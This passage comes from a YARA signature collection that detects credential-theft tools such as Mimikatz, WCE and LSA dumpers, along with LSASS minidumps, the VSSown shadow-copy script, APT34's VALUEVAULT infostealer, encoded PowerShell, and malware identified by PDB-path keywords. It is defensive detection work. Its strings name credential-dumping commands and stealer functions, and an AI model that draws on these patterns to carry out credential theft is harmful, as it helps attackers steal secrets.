	    $s14 = "sekurlsa::dpapi" fullword ascii
	    $s15 = "sekurlsa::credman" fullword ascii
	condition:
		1 of them
}

rule Mimikatz_Memory_Rule_2 : APT {
	meta:
		description = "Mimikatz Rule generated from a memory dump"
		author = "Florian Roth - Florian Roth"
		type = "memory"
		score = 80
	strings:
		$s0 = "sekurlsa::" ascii
		$x1 = "cryptprimitives.pdb" ascii
		$x2 = "Now is t1O" ascii fullword
		$x4 = "ALICE123" ascii
		$x5 = "BOBBY456" ascii
	condition:
		$s0 and 1 of ($x*)
}

rule mimikatz
{
	meta:
		description		= "mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Benjamin DELPY (gentilkiwi)"
      score          = 80
	strings:
		$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }
		$exe_x86_2		= { 89 79 04 89 [0-3] 38 8d 04 b5 }

		$exe_x64_1		= { 4c 03 d8 49 [0-3] 8b 03 48 89 }
		$exe_x64_2		= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }

		$dll_1			= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2			= { c7 0? 10 02 00 00 ?? 89 4? }

		$sys_x86		= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
		$sys_x64		= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }

	condition:
		(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))
}


rule mimikatz_lsass_mdmp
{
	meta:
		description		= "LSASS minidump file for mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$lsass			= "System32\\lsass.exe"	wide nocase

	condition:
		(uint32(0) == 0x504d444d) and $lsass
}

rule wce
{
	meta:
		description		= "wce"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Hernan Ochoa (hernano)"

	strings:
		$hex_legacy		= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }
		$hex_x86		= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }
		$hex_x64		= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }

	condition:
		any of them
}


rule lsadump
{
	meta:
		description		= "LSA dump programe (bootkey/syskey) - pwdump and others"
		author			= "Benjamin DELPY (gentilkiwi)"

	strings:
		$str_sam_inc	= "\\Domains\\Account" ascii nocase
		$str_sam_exc	= "\\Domains\\Account\\Users\\Names\\" ascii nocase
		$hex_api_call	= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }
		$str_msv_lsa	= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }
		$hex_bkey		= { 4b 53 53 4d [20-70] 05 00 01 00}

	condition:
		( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )
      and not uint16(0) == 0x5a4d
}

rule Mimikatz_Logfile
{
	meta:
		description = "Detects a log file generated by malicious hack tool mimikatz"
		author = "Florian Roth"
		score = 80
		date = "2015/03/31"
		reference = "https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar"
	strings:
		$s1 = "SID               :" ascii fullword
		$s2 = "* NTLM     :" ascii fullword
		$s3 = "Authentication Id :" ascii fullword
		$s4 = "wdigest :" ascii fullword
	condition:
		all of them
}

rule AppInitHook {
	meta:
		description = "AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll"
		author = "Florian Roth"
		reference = "https://goo.gl/Z292v6"
		date = "2015-07-15"
		score = 70
		hash = "e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45"
	strings:
		$s0 = "\\Release\\AppInitHook.pdb" ascii
		$s1 = "AppInitHook.dll" fullword ascii
		$s2 = "mimikatz.exe" fullword wide
		$s3 = "]X86Instruction->OperandSize >= Operand->Length" fullword wide
		$s4 = "mhook\\disasm-lib\\disasm.c" fullword wide
		$s5 = "mhook\\disasm-lib\\disasm_x86.c" fullword wide
		$s6 = "VoidFunc" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}

rule VSSown_VBS {
	meta:
		description = "Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere"
		author = "Florian Roth"
		date = "2015-10-01"
		score = 75
	strings:
		$s0 = "Select * from Win32_Service Where Name ='VSS'" ascii
		$s1 = "Select * From Win32_ShadowCopy" ascii
		$s2 = "cmd /C mklink /D " ascii
		$s3 = "ClientAccessible" ascii
		$s4 = "WScript.Shell" ascii
		$s5 = "Win32_Process" ascii
	condition:
		all of them
}
rule APT34_VALUEVAULT: apt34 infostealer winmalware
{
    meta:
        Description= "Information stealing malware used by APT34, written in Go."
        Reference = "https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html"

    strings:
        $fsociety = "fsociety.dat" ascii

        $powershell = "New-Object -ComObject Shell.Application" ascii

        $gobuild = "Go build ID: " ascii

        $gopath01 = "browsers-password-cracker" ascii nocase
        $gopath02 = "main.go" ascii nocase
        $gopath03 = "mozilla.go" ascii nocase
        $gopath04 = "ie.go" ascii nocase
        // main.go, mozilla.go, ie.go, etc etc... this should probably be a regex but this works too i guess :|

        // some function names
        $str1 = "main.Decrypt" ascii fullword
        $str3 = "main.NewBlob" ascii fullword
        $str4 = "main.CheckFileExist" ascii fullword
        $str5 = "main.CopyFileToDirectory" ascii fullword
        $str6 = "main.CrackChromeBased" ascii fullword
        $str7 = "main.CrackIE" ascii fullword
        $str8 = "main.decipherPassword" ascii fullword
        $str9 = "main.DecodeUTF16" ascii fullword
        $str10 = "main.getHashTable" ascii fullword
        $str11 = "main.getHistory" ascii fullword
        $str12 = "main.getHistoryWithPowerShell" ascii fullword
        $str13 = "main.getHistoryFromRegistery" ascii fullword
        $str14 = "main.main" ascii fullword
        $str15 = "main.DecryptAESFromBase64" ascii fullword
        $str16 = "main.DecryptAES" ascii fullword

        // typo of Mozilla is intentional
        $str17 = "main.CrackMozila" ascii fullword
        $str18 = "main.decodeLoginData" ascii fullword
        $str19 = "main.decrypt" ascii fullword
        $str20 = "main.removePadding" ascii fullword
        $str21 = "main.getLoginData" ascii fullword
        $str22 = "main.isMasterPasswordCorrect" ascii fullword
        $str23 = "main.decrypt3DES" ascii fullword
        $str24 = "main.getKey" ascii fullword
        $str25 = "main.manageMasterPassword" ascii fullword
        $str26 = "main.getFirefoxProfiles" ascii fullword
        $str27 = "main._Cfunc_DumpVault" ascii fullword
        $str28 = "main.CrackIEandEdgeNew" ascii fullword
        $str29 = "main.init.ializers" ascii fullword
        $str30 = "main.init" ascii fullword

    condition:
        uint16(0) == 0x5a4d
        and
        (
            (10 of ($str*) and 3 of ($gopath*))
            or
            ($fsociety and $powershell and $gobuild)
            or
            ($fsociety and 10 of ($str*))
        )
}
rule Base64_Encoded_Powershell_Directives
{
    meta:
        Author      = "InQuest Labs"
        Reference   = "https://inquest.net/blog/2019/07/19/base64-encoded-powershell-pivots"
        Samples     = "https://github.com/InQuest/malware-samples/tree/master/2019-07-Base64-Encoded-Powershell-Directives"
        Description = "This signature detects base64 encoded Powershell directives."

    strings:
        // Copy-Item
        $enc01 = /(Q\x32\x39weS\x31JdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Db\x33B\x35LUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x30EUk]NvcHktSXRlb[Q-Za-f])/

        // ForEach-Object
        $enc02 = /(Rm\x39yRWFjaC\x31PYmplY\x33[Q-T]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Gb\x33JFYWNoLU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x30EUk]ZvckVhY\x32gtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z])/

        // Get-ChildItem
        $enc03 = /(R\x32V\x30LUNoaWxkSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtQ\x32hpbGRJdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31DaGlsZEl\x30ZW[\x30-\x33])/

        // Get-ItemPropertyValue
        $enc04 = /(R\x32V\x30LUl\x30ZW\x31Qcm\x39wZXJ\x30eVZhbHVl[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtSXRlbVByb\x33BlcnR\x35VmFsdW[U-X]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31JdGVtUHJvcGVydHlWYWx\x31Z[Q-Za-f])/

        // Get-Random
        $enc05 = /(R\x32V\x30LVJhbmRvb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]HZXQtUmFuZG\x39t[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]dldC\x31SYW\x35kb\x32[\x30-\x33])/

        // Join-Path
        $enc06 = /(Sm\x39pbi\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Kb\x32luLVBhdG[g-j]|[\x2b\x2f-\x39A-Za-z][\x30EUk]pvaW\x34tUGF\x30a[A-P])/

        // Move-Item
        $enc07 = /(TW\x39\x32ZS\x31JdGVt[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Nb\x33ZlLUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x31vdmUtSXRlb[Q-Za-f])/

        // New-Item
        $enc08 = /(TmV\x33LUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]OZXctSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x35ldy\x31JdGVt[\x2b\x2f-\x39A-Za-z])/

        // New-Object
        $enc09 = /(TmV\x33LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]OZXctT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x35ldy\x31PYmplY\x33[Q-T])/

        // Out-String
        $enc10 = /(T\x33V\x30LVN\x30cmluZ[\x2b\x2f-\x39w-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]PdXQtU\x33RyaW\x35n[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30EUk]\x39\x31dC\x31TdHJpbm[c-f])/

        // Remove-Item
        $enc11 = /(UmVtb\x33ZlLUl\x30ZW[\x30-\x33]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]SZW\x31vdmUtSXRlb[Q-Za-f]|[\x2b\x2f-\x39A-Za-z][\x31FVl]JlbW\x39\x32ZS\x31JdGVt[\x2b\x2f-\x39A-Za-z])/

        // Select-Object
        $enc12 = /(U\x32VsZWN\x30LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]TZWxlY\x33QtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NlbGVjdC\x31PYmplY\x33[Q-T])/

        // Sort-Object
        $enc13 = /(U\x32\x39ydC\x31PYmplY\x33[Q-T]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Tb\x33J\x30LU\x39iamVjd[A-P]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NvcnQtT\x32JqZWN\x30[\x2b\x2f-\x39A-Za-z])/

        // Split-Path
        $enc14 = /(U\x33BsaXQtUGF\x30a[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]TcGxpdC\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]NwbGl\x30LVBhdG[g-j])/

        // Test-Path
        $enc15 = /(VGVzdC\x31QYXRo[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]UZXN\x30LVBhdG[g-j]|[\x2b\x2f-\x39A-Za-z][\x31FVl]Rlc\x33QtUGF\x30a[A-P])/

        // Write-Host
        $enc16 = /(V\x33JpdGUtSG\x39zd[A-P]|[\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx]Xcml\x30ZS\x31Ib\x33N\x30[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x31FVl]dyaXRlLUhvc\x33[Q-T])/

        // [Convert]::FromBase64String
        $enc17 = /([\x2b\x2f-\x39A-Za-z][\x2b\x2f-\x39A-Za-z][\x31\x35\x39BFJNRVZdhlptx][\x30\x32Dlu-vy][O]jpGcm\x39tQmFzZTY\x30U\x33RyaW\x35n[\x2b\x2f-\x39A-Za-z]|[\x2b\x2f-\x39A-Za-z][\x30\x32-\x33EG-HUW-Xkm-n][\x34\x38IMQUY]\x36OkZyb\x32\x31CYXNlNjRTdHJpbm[c-f]|[QZb-d][DTjz]o\x36RnJvbUJhc\x32U\x32NFN\x30cmluZ[\x2b\x2f-\x39w-z])/

    condition:
            any of ($enc*)
}
// Rule appendix for the Definitive Dossier of Devilish Debug Details
// Blog link: https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html
// For more info, bother @stvemillertime or the #AdvancedPractices team on Twitter
// Updated on 2019-08-30, initial performance improvements by Florian Roth (@cyb3rops)
import "pe"
// used only in ConventionEngine_Anomaly_OutsideOfDebug
rule ConventionEngine_Keyword_Obfuscat
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "6724cef5a9a670d68e8ec00b6614997c"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}obfuscat[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Hook
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "92156ddfa4c1ec330ffd24ccef127a7a"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}hook[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Evil
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "9359b24a96df49972eda1750a35802de"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}evil[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Inject
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "081686496db01e44871f4e4a09e35fed"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}inject[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Trojan
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "060b2135d69fb33e8fc1c4d2bf7e2899"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}trojan[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Hide
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "dd8af240a7a4a81b5f80250b44a778c4"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}hide[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Anti
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "d350ae5dc15bcc18fde382b84f4bb3d0"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}anti[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Payload
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "10c534cacf65b604c1c2a30341bd2394"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}payload[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Keylog
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "1d7fd704fe4e41feff9e3a005ed868d6"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}keylog[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Bypass
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "00b8356235e510be95e367a25418b5cc"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}bypass[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Beacon
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "798afd5f648774c3133ea5e087efc2c1"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}beacon[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_UAC
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "2e62974fbce2fc1bbde763b986ad7b77"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}uac[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Svchost
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "c1206ba56f7f0c2698adcb3280f345be"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}svchost[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Svhost
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "8edf49fd8421edc7f58997bb16961cf4"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}svhost[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Dropper
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "4847f692942358aff51b72ffcb3e40ac"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}dropper[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Attack
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "d6b1989d9c271b8575326e4fca159ae8"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}attack[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Encrypt
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "65746ec8d8488066a129821c27fcbfb3"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}encrypt[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Exploit
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "4215d029dd26c29ce3e0cab530979b19"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}exploit[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Ransom
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "363bfef1781c107a08f46267f7676579"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}ransom[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Spy
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "15db41840f77723aa7e43460d9d3a5cc"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}spy[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Horse
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "1aa4a05fa321676b9934cd3aa54a5f95"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}horse[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_CVE
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "89dd326a64fdd77b467d2db1cc15e8ef"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}cve[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_shellcode
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "2cd7bc18377abb2464f55453e5bfab20"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}shellcode[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
 (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $pcre
}
rule ConventionEngine_Keyword_Fake
{
 meta:
 author = "@stvemillertime"
 description = "Searching for PE files with PDB path keywords, terms or anomalies."
 sample_md5 = "124c475d67aa8391f5220efcc64ca5b3"
 ref_blog = "https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"
 strings:
 $pcre = /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}fake[\x00-\xFF]{0,200}\.pdb\x00/ nocase ascii
 condition:
